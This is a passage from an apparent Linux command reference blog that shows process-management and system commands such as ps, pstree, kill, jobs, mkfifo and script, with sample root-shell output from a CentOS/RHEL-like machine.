</ul>


<h4>renice</h4>

<blockquote><p> alter priority of running processes</p></blockquote>

<ul>
<li>-n # priority</li>
</ul>


<h4>sleep</h4>

<blockquote><p>delay for a specified amount of time</p></blockquote>

<h4>bg</h4>

<blockquote><p>Resume each suspended job jobspec  in  the  background,  as  if  it  had been started
with &amp;</p></blockquote>

<h4>fg</h4>

<blockquote><p>Resume jobspec in the foreground, and make it the current job</p></blockquote>

<h4>jobs</h4>

<blockquote><p>list active jobs</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> sleep 15 &
</span><span class='line'> [1] 9767
</span><span class='line'> [root@tron ~]# jobs
</span><span class='line'> [1]+  Running                 sleep 15 &</span></code></pre></td></tr></table></div></figure>


<h4>kill</h4>

<blockquote><p>terminate a process</p>

<p>Default is the TERM signal, which is similar to asking nicely to terminate. The more
forcefull option is KILL(9)</p></blockquote>

<ul>
<li>list signals</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> kill -l
</span><span class='line'>  1) SIGHUP    2) SIGINT   3) SIGQUIT  4) SIGILL   5) SIGTRAP
</span><span class='line'>  6) SIGABRT   7) SIGBUS   8) SIGFPE   9) SIGKILL 10) SIGUSR1
</span><span class='line'> 11) SIGSEGV  12) SIGUSR2 13) SIGPIPE 14) SIGALRM 15) SIGTERM
</span><span class='line'> 16) SIGSTKFLT    17) SIGCHLD 18) SIGCONT 19) SIGSTOP 20) SIGTSTP
</span><span class='line'> 21) SIGTTIN  22) SIGTTOU 23) SIGURG  24) SIGXCPU 25) SIGXFSZ
</span><span class='line'> 26) SIGVTALRM    27) SIGPROF 28) SIGWINCH    29) SIGIO   30) SIGPWR
</span><span class='line'> 31) SIGSYS   34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+3
</span><span class='line'> 38) SIGRTMIN+4   39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+8
</span><span class='line'> 43) SIGRTMIN+9   44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13
</span><span class='line'> 48) SIGRTMIN+14  49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12
</span><span class='line'> 53) SIGRTMAX-11  54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-7
</span><span class='line'> 58) SIGRTMAX-6   59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-2
</span><span class='line'> 63) SIGRTMAX-1   64) SIGRTMAX</span></code></pre></td></tr></table></div></figure>


<h4>pgrep,  pkill</h4>

<blockquote><p>look  up  or signal processes based on name and other attributes</p></blockquote>

<h4>ps</h4>

<blockquote><p>report a snapshot of the current processes</p></blockquote>

<ul>
<li>-e # Select all processes.  Identical to -A</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ps -e
</span><span class='line'>   PID TTY          TIME CMD
</span><span class='line'>     1 ?        00:00:02 systemd
</span><span class='line'>     2 ?        00:00:00 kthreadd
</span><span class='line'>     3 ?        00:00:00 ksoftirqd/0
</span><span class='line'>     5 ?        00:00:00 kworker/0:0H
</span><span class='line'>     7 ?        00:00:00 migration/0
</span><span class='line'>     8 ?        00:00:00 rcu_bh
</span><span class='line'>     9 ?        00:00:00 rcu_sched
</span><span class='line'>    10 ?        00:00:00 watchdog/0
</span><span class='line'>    12 ?        00:00:00 kdevtmpfs
</span><span class='line'>[...]
</span><span class='line'>  3591 pts/0    00:00:00 man
</span><span class='line'>  3598 pts/0    00:00:00 less
</span><span class='line'>  3608 ?        00:00:00 sleep
</span><span class='line'>  3614 pts/1    00:00:00 ps</span></code></pre></td></tr></table></div></figure>


<ul>
<li>-r #  Restrict the selection to only running processes</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ps -r
</span><span class='line'>   PID TTY      STAT   TIME COMMAND
</span><span class='line'>  1354 tty1     Rs+    0:08 /usr/bin/Xorg :0 -background none -noreset -audit 4 -
</span><span class='line'>  3805 pts/1    R+     0:00 ps -r</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>-u # Select by effective user ID (EUID) or name</p></li>
<li><p>process tree</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ps --forest
</span><span class='line'>   PID TTY          TIME CMD
</span><span class='line'>  3508 pts/1    00:00:00 bash
</span><span class='line'>  3880 pts/1    00:00:00  \_ ps</span></code></pre></td></tr></table></div></figure>


<ul>
<li>all processes + EUID</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ps -aux
</span><span class='line'> USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
</span><span class='line'> root         1  0.1  0.3 128088  6756 ?        Ss   17:03   0:02 /usr/lib/system
</span><span class='line'> root         2  0.0  0.0      0     0 ?        S    17:03   0:00 [kthreadd]
</span><span class='line'> root         3  0.0  0.0      0     0 ?        S    17:03   0:00 [ksoftirqd/0]
</span><span class='line'> root         7  0.0  0.0      0     0 ?        S    17:03   0:00 [migration/0]
</span><span class='line'> root         8  0.0  0.0      0     0 ?        S    17:03   0:00 [rcu_bh]
</span><span class='line'> root         9  0.0  0.0      0     0 ?        R    17:03   0:00 [rcu_sched]
</span><span class='line'> root        10  0.0  0.0      0     0 ?        S    17:03   0:00 [watchdog/0]
</span><span class='line'> root        12  0.0  0.0      0     0 ?        S    17:03   0:00 [kdevtmpfs]
</span><span class='line'> root        13  0.0  0.0      0     0 ?        S&lt;   17:03   0:00 [netns]
</span><span class='line'> root        14  0.0  0.0      0     0 ?        S    17:03   0:00 [khungtaskd]
</span><span class='line'> root        15  0.0  0.0      0     0 ?        S&lt;   17:03   0:00 [writeback]
</span><span class='line'> root        16  0.0  0.0      0     0 ?        S&lt;   17:03   0:00 [kintegrityd]
</span><span class='line'> root        17  0.0  0.0      0     0 ?        S&lt;   17:03   0:00 [bioset]
</span><span class='line'> root        18  0.0  0.0      0     0 ?        S&lt;   17:03   0:00 [kblockd]
</span><span class='line'> root        19  0.0  0.0      0     0 ?        S&lt;   17:03   0:00 [md]
</span><span class='line'> root        25  0.0  0.0      0     0 ?        S    17:04   0:00 [kswapd0]
</span><span class='line'> root        26  0.0  0.0      0     0 ?        SN   17:04   0:00 [ksmd]
</span><span class='line'> root        27  0.0  0.0      0     0 ?        SN   17:04   0:00 [khugepaged]
</span><span class='line'> root        28  0.0  0.0      0     0 ?        S    17:04   0:00 [fsnotify_mark]
</span><span class='line'> root        29  0.0  0.0      0     0 ?        S&lt;   17:04   0:00 [crypto]
</span><span class='line'> [...]
</span><span class='line'> root       587  0.0  0.3  47700  5856 ?        Ss   17:04   0:00 /usr/lib/system
</span><span class='line'> root       625  0.0  0.0      0     0 ?        S&lt;   17:04   0:00 [nfit]
</span><span class='line'> root       666  0.0  0.0      0     0 ?        S&lt;   17:04   0:00 [xfs-buf/sda1]
</span><span class='line'> dbus       727  0.0  0.1  36328  3332 ?        Ssl  17:04   0:01 /bin/dbus-daemo
</span><span class='line'> root       734  0.0  0.0 201208  1208 ?        Ssl  17:04   0:00 /usr/sbin/gsspr
</span><span class='line'> root      2862  0.0  0.1 380356  3468 ?        Sl   17:06   0:00 /usr/libexec/gv
</span><span class='line'> root      3508  0.0  0.1 116688  3392 pts/1    Ss   17:07   0:00 bash
</span><span class='line'> root      3591  0.0  0.1 119548  2292 pts/0    S+   17:12   0:00 man ps
</span><span class='line'> root      3598  0.0  0.0 110248   960 pts/0    S+   17:12   0:00 less -s
</span><span class='line'> root      3718  0.0  0.0      0     0 ?        S&lt;   17:22   0:00 [kworker/0:2H]
</span><span class='line'> root      3743  0.0  0.0      0     0 ?        S    17:24   0:00 [kworker/0:0]
</span><span class='line'> root      3819  0.0  0.0      0     0 ?        S&lt;   17:27   0:00 [kworker/0:1H]
</span><span class='line'> root      3892  0.1  0.0      0     0 ?        S    17:29   0:00 [kworker/0:2]
</span><span class='line'> root      3955  0.0  0.0      0     0 ?        S&lt;   17:33   0:00 [kworker/0:0H]
</span><span class='line'> root      3967  0.0  0.0 107892   604 ?        S    17:34   0:00 sleep 60
</span><span class='line'> root      3968  0.1  0.0      0     0 ?        R    17:34   0:00 [kworker/0:1]
</span><span class='line'> root      3979  0.0  0.0 153136  1876 pts/1    R+   17:35   0:00 ps -aux</span></code></pre></td></tr></table></div></figure>


<ul>
<li>long format, don&rsquo;t show flags</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ps -ly
</span><span class='line'> S   UID   PID  PPID  C PRI  NI   RSS    SZ WCHAN  TTY          TIME CMD
</span><span class='line'> S     0  3508  3438  0  80   0  3392 29172 wait   pts/1    00:00:00 bash
</span><span class='line'> R     0  4002  3508  0  80   0  1452 37232 -      pts/1    00:00:00 ps</span></code></pre></td></tr></table></div></figure>


<ul>
<li>get running processes</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> echo $$
</span><span class='line'> 3744
</span><span class='line'> ps -p $$ -F
</span><span class='line'> UID        PID  PPID  C    SZ   RSS PSR STIME TTY          TIME CMD
</span><span class='line'> root      3697  3692  0 29172  3372   0 13:09 pts/0    00:00:00 bash</span></code></pre></td></tr></table></div></figure>


<h4>pstree</h4>

<blockquote><p>display a tree of processes</p></blockquote>

<ul>
<li>-a # Show  command  line arguments</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> pstree -a
</span><span class='line'> systemd --switched-root --system --deserialize 21
</span><span class='line'>   ModemManager
</span><span class='line'>      2*[{ModemManager}]
</span><span class='line'>   NetworkManager --no-daemon
</span><span class='line'>      dhclient -d -q -sf /usr/libexec/nm-dhcp-helper -pf /var/run/dhclient-enp0s3.pid -lf ...
</span><span class='line'>      2*[{NetworkManager}]
</span><span class='line'>   abrt-watch-log -F BUG: WARNING: at WARNING: CPU: INFO: possible recursive locking detected ernel BUG at list_del corruption list_add corruptiondo_IRQ: stack overfl
</span><span class='line'>   abrt-watch-log -F Backtrace /var/log/Xorg.0.log -- /usr/bin/abrt-dump-xorg -xD
</span><span class='line'>   abrtd -d -s
</span><span class='line'>   accounts-daemon
</span><span class='line'>      2*[{accounts-daemon}]
</span><span class='line'>   alsactl -s -n 19 -c -E ALSA_CONFIG_PATH=/etc/alsa/alsactl.conf --initfile=/lib/alsa/init/00main rdaemon
</span><span class='line'>   at-spi-bus-laun
</span><span class='line'>      dbus-daemon --config-file=/etc/at-spi2/accessibility.conf --nofork --print-address 3
</span><span class='line'>         {dbus-daemon}
</span><span class='line'>      3*[{at-spi-bus-laun}]
</span><span class='line'>   at-spi2-registr --use-gnome-session
</span><span class='line'>      2*[{at-spi2-registr}]
</span><span class='line'>   atd -f
</span><span class='line'>   auditd -n
</span><span class='line'>      audispd
</span><span class='line'>         sedispatch
</span><span class='line'>         {audispd}
</span><span class='line'>      {auditd}
</span><span class='line'>   avahi-daemon
</span><span class='line'>      avahi-daemon
</span><span class='line'>   caribou
</span><span class='line'>      2*[{caribou}]
</span><span class='line'>   colord
</span><span class='line'>      2*[{colord}]
</span><span class='line'>   crond -n
</span><span class='line'>   cupsd -f
</span><span class='line'>   dbus-daemon --fork --print-pid 4 --print-address 6 --session
</span><span class='line'>      {dbus-daemon}
</span><span class='line'>   dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
</span><span class='line'>      {dbus-daemon}
</span><span class='line'>   dbus-launch --sh-syntax --exit-with-session
</span><span class='line'>   dconf-service
</span><span class='line'>      2*[{dconf-service}]
</span><span class='line'>   dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default.conf --leasefile-ro --dhcp-script=/usr/libexec/libvirt_leaseshelper
</span><span class='line'>      dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default.conf --leasefile-ro --dhcp-script=/usr/libexec/libvirt_leaseshelper
</span><span class='line'>   evolution-calen
</span><span class='line'>      5*[{evolution-calen}]
</span><span class='line'>   evolution-sourc
</span><span class='line'>      2*[{evolution-sourc}]
</span><span class='line'>   gconfd-2
</span><span class='line'>   gdm
</span><span class='line'>      Xorg :0 -background none -noreset -audit 4 -verbose -auth /run/gdm/auth-for-gdm-kJZtDT/database -seat seat0 -nolisten tcp vt1
</span><span class='line'>      gdm-session-wor
</span><span class='line'>         gnome-session --session gnome-classic
</span><span class='line'>            abrt-applet
</span><span class='line'>               2*[{abrt-applet}]
</span><span class='line'>            gnome-settings-
</span><span class='line'>               5*[{gnome-settings-}]
</span><span class='line'>            gnome-shell
</span><span class='line'>               ibus-daemon --xim --panel disable
</span><span class='line'>                  ibus-dconf
</span><span class='line'>                     3*[{ibus-dconf}]
</span><span class='line'>                  ibus-engine-sim
</span><span class='line'>                     2*[{ibus-engine-sim}]
</span><span class='line'>                  2*[{ibus-daemon}]
</span><span class='line'>               6*[{gnome-shell}]
</span><span class='line'>            gnome-software --gapplication-service
</span><span class='line'>               3*[{gnome-software}]
</span><span class='line'>            nautilus --no-default-window --force-desktop
</span><span class='line'>               3*[{nautilus}]
</span><span class='line'>            rhsm-icon
</span><span class='line'>               2*[{rhsm-icon}]
</span><span class='line'>            seapplet
</span><span class='line'>            ssh-agent /bin/sh -c exec -l /bin/bash -c "env GNOME_SHELL_SESSION_MODE=classic gnome-session --session gnome-classic"
</span><span class='line'>            tracker-extract
</span><span class='line'>               13*[{tracker-extract}]
</span><span class='line'>            tracker-miner-a
</span><span class='line'>               2*[{tracker-miner-a}]
</span><span class='line'>            tracker-miner-f
</span><span class='line'>               3*[{tracker-miner-f}]
</span><span class='line'>            tracker-miner-u
</span><span class='line'>               2*[{tracker-miner-u}]
</span><span class='line'>            3*[{gnome-session}]
</span><span class='line'>         2*[{gdm-session-wor}]
</span><span class='line'>      3*[{gdm}]
</span><span class='line'>   gnome-keyring-d --daemonize --login
</span><span class='line'>      4*[{gnome-keyring-d}]
</span><span class='line'>   gnome-shell-cal
</span><span class='line'>      5*[{gnome-shell-cal}]
</span><span class='line'>   gnome-terminal-
</span><span class='line'>      bash
</span><span class='line'>         man pstree
</span><span class='line'>             less -s
</span><span class='line'>      bash
</span><span class='line'>         pstree -a
</span><span class='line'>      gnome-pty-helpe
</span><span class='line'>      3*[{gnome-terminal-}]
</span><span class='line'>   goa-daemon
</span><span class='line'>      3*[{goa-daemon}]
</span><span class='line'>   goa-identity-se
</span><span class='line'>      3*[{goa-identity-se}]
</span><span class='line'>   gsd-printer
</span><span class='line'>      2*[{gsd-printer}]
</span><span class='line'>   gssproxy -D
</span><span class='line'>      5*[{gssproxy}]
</span><span class='line'>   gvfs-afc-volume
</span><span class='line'>      3*[{gvfs-afc-volume}]
</span><span class='line'>   gvfs-goa-volume
</span><span class='line'>      2*[{gvfs-goa-volume}]
</span><span class='line'>   gvfs-gphoto2-vo
</span><span class='line'>      2*[{gvfs-gphoto2-vo}]
</span><span class='line'>   gvfs-mtp-volume
</span><span class='line'>      2*[{gvfs-mtp-volume}]
</span><span class='line'>   gvfs-udisks2-vo
</span><span class='line'>      2*[{gvfs-udisks2-vo}]
</span><span class='line'>   gvfsd
</span><span class='line'>      2*[{gvfsd}]
</span><span class='line'>   gvfsd-fuse /run/user/0/gvfs -f -o big_writes
</span><span class='line'>      5*[{gvfsd-fuse}]
</span><span class='line'>   gvfsd-metadata
</span><span class='line'>      2*[{gvfsd-metadata}]
</span><span class='line'>   gvfsd-trash --spawner :1.3 /org/gtk/gvfs/exec_spaw/0
</span><span class='line'>      2*[{gvfsd-trash}]
</span><span class='line'>   ibus-x11 --kill-daemon
</span><span class='line'>      2*[{ibus-x11}]
</span><span class='line'>   ksmtuned /usr/sbin/ksmtuned
</span><span class='line'>      sleep 60
</span><span class='line'>   libvirtd
</span><span class='line'>      15*[{libvirtd}]
</span><span class='line'>   lsmd -d
</span><span class='line'>   lvmetad -f
</span><span class='line'>   master -w
</span><span class='line'>      pickup -l -t unix -u
</span><span class='line'>      qmgr -l -t unix -u
</span><span class='line'>   mcelog --ignorenodev --daemon --syslog
</span><span class='line'>   mission-control
</span><span class='line'>      3*[{mission-control}]
</span><span class='line'>   packagekitd
</span><span class='line'>      2*[{packagekitd}]
</span><span class='line'>   polkitd --no-debug
</span><span class='line'>      5*[{polkitd}]
</span><span class='line'>   pulseaudio --start
</span><span class='line'>      {pulseaudio}
</span><span class='line'>   rhnsd
</span><span class='line'>   rhsmcertd
</span><span class='line'>   rngd -f
</span><span class='line'>   rsyslogd -n
</span><span class='line'>      2*[{rsyslogd}]
</span><span class='line'>   rtkit-daemon
</span><span class='line'>      2*[{rtkit-daemon}]
</span><span class='line'>   smartd -n -q never
</span><span class='line'>   sshd -D
</span><span class='line'>   systemd-journal
</span><span class='line'>   systemd-logind
</span><span class='line'>   systemd-udevd
</span><span class='line'>   tracker-store
</span><span class='line'>      7*[{tracker-store}]
</span><span class='line'>   tuned -Es /usr/sbin/tuned -l -P
</span><span class='line'>      4*[{tuned}]
</span><span class='line'>   udisksd --no-debug
</span><span class='line'>      4*[{udisksd}]
</span><span class='line'>   upowerd
</span><span class='line'>      2*[{upowerd}]
</span><span class='line'>   vmtoolsd
</span><span class='line'>      {vmtoolsd}
</span><span class='line'>   vmtoolsd -n vmusr
</span><span class='line'>   wpa_supplicant -u -f /var/log/wpa_supplicant.log -c /etc/wpa_supplicant/wpa_supplicant.conf -P /var/run/wpa_supplicant.pid</span></code></pre></td></tr></table></div></figure>


<h4>runlevel</h4>

<blockquote><p>Print previous and current SysV runlevel</p>

<p>If a runlevel cannot be determined, N is printed instead</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> runlevel
</span><span class='line'> N 5</span></code></pre></td></tr></table></div></figure>


<h4>init / telinit</h4>

<ul>
<li>legacy</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> init [OPTIONS...] {COMMAND}
</span><span class='line'> 
</span><span class='line'> Send control commands to the init daemon.
</span><span class='line'> 
</span><span class='line'>      --help      Show this help
</span><span class='line'>      --no-wall   Don't send wall message before halt/power-off/reboot
</span><span class='line'> 
</span><span class='line'> Commands:
</span><span class='line'>   0              Power-off the machine
</span><span class='line'>   6              Reboot the machine
</span><span class='line'>   2, 3, 4, 5     Start runlevelX.target unit
</span><span class='line'>   1, s, S        Enter rescue mode
</span><span class='line'>   q, Q           Reload init daemon configuration
</span><span class='line'>   u, U           Reexecute init daemon</span></code></pre></td></tr></table></div></figure>


<h4>mkfifo</h4>

<blockquote><p>make FIFOs (named pipes)</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> mkfifo /tmp/pipe
</span><span class='line'> [root@tron ~]# ls -l /tmp/pipe
</span><span class='line'> prw-r--r--. 1 root root 0 Sep 27 13:32 /tmp/pipe</span></code></pre></td></tr></table></div></figure>


<h4>script</h4>

<blockquote><p>make typescript of terminal session</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> script
</span><span class='line'> Script started, file is typescript
</span><span class='line'> [root@tron ~]# ls
</span><span class='line'> anaconda-ks.cfg  Downloads             Music          Templates
</span><span class='line'> Desktop          hashes.txt            openscap_data  test.txt
</span><span class='line'> dns.conf         initial-setup-ks.cfg  Pictures       typescript
</span><span class='line'> Documents        man.txt               Public         Videos
</span><span class='line'> [root@tron ~]# rm -f dns.conf hashes.txt
</span><span class='line'> [root@tron ~]# exit
</span><span class='line'> exit
</span><span class='line'> Script done, file is typescript
</span><span class='line'> [root@tron ~]# cat typescript
</span><span class='line'> Script started on Wed 27 Sep 2017 01:34:50 PM EEST
</span><span class='line'> [root@tron ~]# ls
</span><span class='line'> anaconda-ks.cfg  Downloads             Music          Templates
</span><span class='line'> Desktop          hashes.txt            openscap_data  test.txt
</span><span class='line'> dns.conf         initial-setup-ks.cfg  Pictures       typescript
</span><span class='line'> Documents        man.txt               Public         Videos
</span><span class='line'> [root@tron ~]# rm -f dns.conf hashes.txt
</span><span class='line'> [root@tron ~]# exit
</span><span class='line'> exit
</span><span class='line'> 
</span><span class='line'> Script done on Wed 27 Sep 2017 01:35:18 PM EEST</span></code></pre></td></tr></table></div></figure>


<h4>stat</h4>

<blockquote><p>display file or file system status</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
